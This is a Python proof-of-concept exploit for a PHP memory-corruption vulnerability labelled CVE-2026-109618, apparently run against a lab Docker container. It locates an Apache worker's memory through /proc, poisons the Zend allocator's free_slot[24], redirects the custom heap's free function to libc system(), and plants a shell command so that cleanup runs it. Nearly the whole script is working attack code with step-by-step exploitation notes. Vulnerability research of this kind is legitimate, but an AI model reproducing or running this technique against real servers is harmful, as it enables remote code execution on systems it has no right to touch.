#!/usr/bin/env python3
"""
Chain D RCE PoC: CVE-2026-109618
=================================
OOM → ZMM stale → free_slot[24] poisoning → arData hijack → custom_heap → system()

Attack principle:
  PHP's HashTable stores an arData allocation containing [hash_indices | bucket_data].
  zend_hash_destroy() iterates buckets, then calls efree(HT_GET_DATA_ADDR(ht))
  on the hash_indices start — WITHOUT any refcount check.

  By poisoning free_slot[24] (bin size 1280), we redirect the arData allocation
  to a controlled ZMM page. During the sleep window we overwrite the hash indices
  area (first 128 bytes) with a shell command, then enable custom_heap._free = system().

  On cleanup: efree(hash_indices_ptr) → system("our_command") → RCE.

  This bypasses the gc header problem that blocks the zend_string approach:
  zend_string_release requires refcount=1 → first byte 0x01, second 0x00 → system("\x01").
  arData has no gc header, so byte 0 IS our command.

Allocation math for rce_target.php (20 string-keyed entries):
  nTableSize = 32 (next pow2 >= 20)
  hash_size  = 32 * sizeof(uint32_t)  = 128 bytes
  data_size  = 32 * sizeof(Bucket)    = 32 * 32 = 1024 bytes
  total      = 1152 bytes → bin 24 (1280 bytes)
"""

import base64
import re
import struct
import subprocess
import sys
import time
import threading

CONTAINER = "php2shell-apache"
PAGE_SIZE = 4096
CHUNK_SIZE = 2 * 1024 * 1024  # 2MB ZMM main chunk

# ZMM chunk layout offsets
USE_CUSTOM_HEAP_OFF = 0x40   # heap->use_custom_heap (int, at chunk+0x40)
FREE_SLOT_OFF       = 0x60   # heap->free_slot[30] (at chunk+0x60)
CUSTOM_MALLOC_OFF   = 0x1A8  # heap->custom_heap._malloc (at chunk+0x1A8)
CUSTOM_FREE_OFF     = 0x1B0  # heap->custom_heap._free   (at chunk+0x1B0)
CUSTOM_REALLOC_OFF  = 0x1B8  # heap->custom_heap._realloc(at chunk+0x1B8)
MAP_OFF             = 0x208  # chunk->map[512] (at chunk+0x208)

# Bin config
TARGET_BIN  = 24             # 1280 bytes — matches arData for 20-entry mixed HashTable
BIN_SIZE    = 1280
SLOTS_PER_PAGE = PAGE_SIZE // BIN_SIZE  # 3

# Hash indices area size (what we overwrite with command)
HASH_INDICES_SIZE = 128  # 32 * sizeof(uint32_t) for nTableSize=32

# Shell command to execute
SHELL_CMD = b"id>/tmp/chain_d_rce_proof"


# ─── helpers ──────────────────────────────────────────────────────────

def docker_exec(cmd, timeout=30):
    r = subprocess.run(
        ["docker", "exec", CONTAINER, "bash", "-c", cmd],
        capture_output=True, text=True, timeout=timeout)
    return r.stdout.strip()


def read_mem(pid, addr, length):
    b64cmd = (
        f"perl -e '"
        f'open my $fh, "<:raw", "/proc/{pid}/mem" or die "open: $!";'
        f"seek $fh, {addr}, 0 or die;"
        f"read $fh, my $buf, {length} or die;"
        f'use MIME::Base64; print encode_base64($buf, "");'
        f"close $fh;'"
    )
    out = docker_exec(b64cmd)
    return base64.b64decode(out) if out else None


def write_mem(pid, addr, data):
    b64 = base64.b64encode(data).decode()
    cmd = (
        f"perl -e '"
        f"use MIME::Base64;"
        f'my $d = decode_base64("{b64}");'
        f'open my $fh, "+<:raw", "/proc/{pid}/mem" or die;'
        f"seek $fh, {addr}, 0 or die;"
        f'print $fh $d or die;'
        f"close $fh;'"
    )
    docker_exec(cmd)


def write_qword(pid, addr, val):
    write_mem(pid, addr, struct.pack("<Q", val))


def write_dword(pid, addr, val):
    write_mem(pid, addr, struct.pack("<I", val))


def read_qword(pid, addr):
    d = read_mem(pid, addr, 8)
    return struct.unpack("<Q", d)[0] if d else None


# ─── reconnaissance ──────────────────────────────────────────────────

def get_worker_pid():
    out = docker_exec("pgrep -u www-data apache2 | head -1")
    return int(out) if out and out.isdigit() else None


def get_zmm_chunk(pid):
    """Find the 2MB anonymous mapping = ZMM main chunk."""
    out = docker_exec(f"grep 'rw-p.*00:00' /proc/{pid}/maps")
    for line in out.split("\n"):
        if not line.strip():
            continue
        addrs = line.strip().split()[0]
        start, end = (int(x, 16) for x in addrs.split("-"))
        if end - start == CHUNK_SIZE:
            return start
    return None


def get_base(pid, pattern):
    out = docker_exec(f"grep '{pattern}' /proc/{pid}/maps | head -1 | cut -d- -f1")
    return int(out.strip(), 16) if out and out.strip() else None


def get_sym(lib_path, name):
    for flag in ["-T", "-t"]:
        out = docker_exec(f"objdump {flag} {lib_path} 2>/dev/null | grep -w '{name}' | head -1")
        if out:
            return int(out.split()[0], 16)
    return None


def find_free_page(pid, chunk):
    """Find a free page (map==0) in the upper region of the chunk."""
    map_data = read_mem(pid, chunk + MAP_OFF, 512 * 4)
    if not map_data:
        return None
    # Search from page 300 upward to avoid conflicts with normal allocations
    for pg in range(300, 500):
        val = struct.unpack_from("<I", map_data, pg * 4)[0]
        if val == 0:
            return pg
    return None


# ─── main exploit ────────────────────────────────────────────────────

def main():
    print("=" * 70)
    print("  Chain D RCE PoC: CVE-2026-109618")
    print("  OOM → ZMM stale → free_slot poison → arData hijack → system()")
    print("=" * 70)

    # ── Phase 1: Reconnaissance ──────────────────────────────────────

    print("\n[Phase 1] Reconnaissance")

    # Warm up worker
    docker_exec("curl -s http://localhost/index.php >/dev/null")
    time.sleep(0.5)

    pid = get_worker_pid()
    if not pid:
        print("  ERROR: no worker found")
        return False
    chunk = get_zmm_chunk(pid)
    libc_base = get_base(pid, "r--p.*libc.so")
    libphp_base = get_base(pid, "r--p.*libphp")

    print(f"  Worker PID : {pid}")
    print(f"  ZMM chunk  : 0x{chunk:x}")
    print(f"  libc base  : 0x{libc_base:x}")
    print(f"  libphp base: 0x{libphp_base:x}")

    # Resolve function addresses
    libc_path = docker_exec("find / -name 'libc.so.6' 2>/dev/null | head -1")
    system_off  = get_sym(libc_path, "system")
    malloc_off  = get_sym(libc_path, "malloc")
    realloc_off = get_sym(libc_path, "realloc")

    system_addr  = libc_base + system_off
    malloc_addr  = libc_base + malloc_off
    realloc_addr = libc_base + realloc_off

    print(f"  system()   : 0x{system_addr:x}")
    print(f"  malloc()   : 0x{malloc_addr:x}")
    print(f"  realloc()  : 0x{realloc_addr:x}")

    # ── Phase 2: Prepare controlled page ─────────────────────────────

    print(f"\n[Phase 2] Preparing ZMM page for bin {TARGET_BIN} ({BIN_SIZE} bytes)")

    target_page = find_free_page(pid, chunk)
    if target_page is None:
        print("  ERROR: no free page found")
        return False

    page_addr = chunk + target_page * PAGE_SIZE
    print(f"  Target page: {target_page} (0x{page_addr:x})")

    # Build free list chain: 3 slots of 1280 bytes each on this page
    page_data = bytearray(PAGE_SIZE)
    for i in range(SLOTS_PER_PAGE):
        slot_off = i * BIN_SIZE
        if i < SLOTS_PER_PAGE - 1:
            next_ptr = page_addr + (i + 1) * BIN_SIZE
        else:
            next_ptr = 0  # NULL = end of chain
        struct.pack_into("<Q", page_data, slot_off, next_ptr)
        # Fill rest with recognisable marker
        marker = b"SLOT" + struct.pack("<H", i)
        page_data[slot_off + 8 : slot_off + 8 + len(marker)] = marker

    write_mem(pid, page_addr, bytes(page_data))

    # Poison free_slot[24] → first slot on our page
    fs_addr = chunk + FREE_SLOT_OFF + TARGET_BIN * 8
    write_qword(pid, fs_addr, page_addr)

    # Mark page as SRUN(24) in map
    map_entry_addr = chunk + MAP_OFF + target_page * 4
    write_dword(pid, map_entry_addr, 0x80000000 | TARGET_BIN)

    # Verify
    fs_val = read_qword(pid, fs_addr)
    print(f"  free_slot[{TARGET_BIN}] = 0x{fs_val:x} {'OK' if fs_val == page_addr else 'MISMATCH'}")

    # ── Phase 3: Trigger ─────────────────────────────────────────────

    print(f"\n[Phase 3] Sending request to rce_target.php")
    docker_exec("rm -f /tmp/chain_d_rce_proof")

    result = {"resp": None, "err": None}

    def bg_request():
        try:
            result["resp"] = docker_exec(
                "curl -s --max-time 60 http://localhost/rce_target.php",
                timeout=65)
        except Exception as e:
            result["err"] = str(e)

    t = threading.Thread(target=bg_request)
    t.start()

    # Wait for PHP to allocate everything and enter sleep()
    print("  Waiting 5s for allocations + sleep entry...")
    time.sleep(5)

    # Verify worker is still alive with same PID
    cur_pid = get_worker_pid()
    if cur_pid != pid:
        print(f"  WARNING: PID changed {pid} -> {cur_pid}")
        if cur_pid:
            pid = cur_pid
            chunk = get_zmm_chunk(pid)
            page_addr = chunk + target_page * PAGE_SIZE
        else:
            print("  ERROR: worker gone")
            t.join(timeout=5)
            return False
    print(f"  Worker alive: PID {pid}")

    # ── Phase 4: Exploitation ────────────────────────────────────────

    print(f"\n[Phase 4] Exploitation during sleep window")

    # 4a. Check which slots were consumed
    consumed = []
    for i in range(SLOTS_PER_PAGE):
        slot_addr = page_addr + i * BIN_SIZE
        head = read_mem(pid, slot_addr, 16)
        if not head:
            continue
        first_qword = struct.unpack("<Q", head[:8])[0]
        marker = head[8:12]
        # Unconsumed: bytes 8-11 = b"SLOT"; consumed: PHP overwrote it
        if marker != b"SLOT":
            consumed.append(i)
            print(f"  Slot {i}: CONSUMED (first bytes: {head[:8].hex()})")
        else:
            print(f"  Slot {i}: free (chain intact)")

    if not consumed:
        print("  WARNING: no slots consumed — bin mismatch?")
        print("  Overwriting all slots anyway (shotgun approach).")

    # 4b. Write shell command to the hash-indices area of EVERY slot.
    #     Only the arData slot will actually be efree'd by zend_hash_destroy;
    #     others will be efree'd as part of whatever structure consumed them —
    #     either way, system(cmd) runs.
    cmd_padded = (SHELL_CMD + b"\x00") + b"\x00" * (HASH_INDICES_SIZE - len(SHELL_CMD) - 1)
    for i in range(SLOTS_PER_PAGE):
        slot_addr = page_addr + i * BIN_SIZE
        write_mem(pid, slot_addr, cmd_padded)

    # Verify command written
    check = read_mem(pid, page_addr, len(SHELL_CMD) + 1)
    if check and check[:len(SHELL_CMD)] == SHELL_CMD:
        print(f"  Command written: {SHELL_CMD.decode()}")
    else:
        print(f"  WARNING: verify failed: {check[:32].hex() if check else 'None'}")

    # 4c. Enable custom heap: _free=system, _malloc=malloc, _realloc=realloc
    print(f"  Enabling custom heap (_free = system)...")
    write_qword(pid, chunk + CUSTOM_MALLOC_OFF,  malloc_addr)
    write_qword(pid, chunk + CUSTOM_FREE_OFF,    system_addr)
    write_qword(pid, chunk + CUSTOM_REALLOC_OFF, realloc_addr)
    write_dword(pid, chunk + USE_CUSTOM_HEAP_OFF, 1)

    uch = struct.unpack("<I", read_mem(pid, chunk + USE_CUSTOM_HEAP_OFF, 4))[0]
    cfree = read_qword(pid, chunk + CUSTOM_FREE_OFF)
    print(f"  use_custom_heap = {uch}")
    print(f"  custom._free    = 0x{cfree:x}  (system @ 0x{system_addr:x})")
    print(f"  All efree() calls now redirect to system(ptr)")

    # ── Phase 5: Wait and verify ─────────────────────────────────────

    print(f"\n[Phase 5] Waiting for cleanup (sleep has ~{30-5}s remaining)...")
    t.join(timeout=45)

    if result["err"]:
        print(f"  Request error: {result['err']}")
    elif result["resp"]:
        print(f"  Response:")
        for line in result["resp"].split("\n")[:10]:
            print(f"    {line}")
    else:
        print(f"  No response (worker likely crashed during cleanup)")

    # Check RCE proof
    time.sleep(2)
    proof = docker_exec("cat /tmp/chain_d_rce_proof 2>/dev/null")
    if proof:
        print(f"\n  *** RCE CONFIRMED ***")
        print(f"  /tmp/chain_d_rce_proof:")
        for line in proof.split("\n"):
            print(f"    {line}")

        # Reset custom heap
        new_pid = get_worker_pid()
        if new_pid:
            new_chunk = get_zmm_chunk(new_pid)
            if new_chunk:
                write_dword(new_pid, new_chunk + USE_CUSTOM_HEAP_OFF, 0)
                print(f"\n  Custom heap reset on PID {new_pid}")
        return True

    print(f"\n  RCE proof NOT found — diagnostics:")
    new_pid = get_worker_pid()
    if new_pid and new_pid != pid:
        print(f"  Worker replaced: {pid} -> {new_pid}")
    elif new_pid == pid:
        print(f"  Worker survived (PID {pid})")
        write_dword(pid, chunk + USE_CUSTOM_HEAP_OFF, 0)
    else:
        print(f"  No worker found")
    errlog = docker_exec("tail -10 /var/log/apache2/error.log 2>/dev/null")
    if errlog:
        print(f"  Error log:")
        for line in errlog.split("\n"):
            print(f"    {line}")

    return False


if __name__ == "__main__":
    ok = main()
    print(f"\n{'=' * 70}")
    print(f"  Result: {'RCE ACHIEVED' if ok else 'needs investigation'}")
    print(f"{'=' * 70}")
    sys.exit(0 if ok else 1)
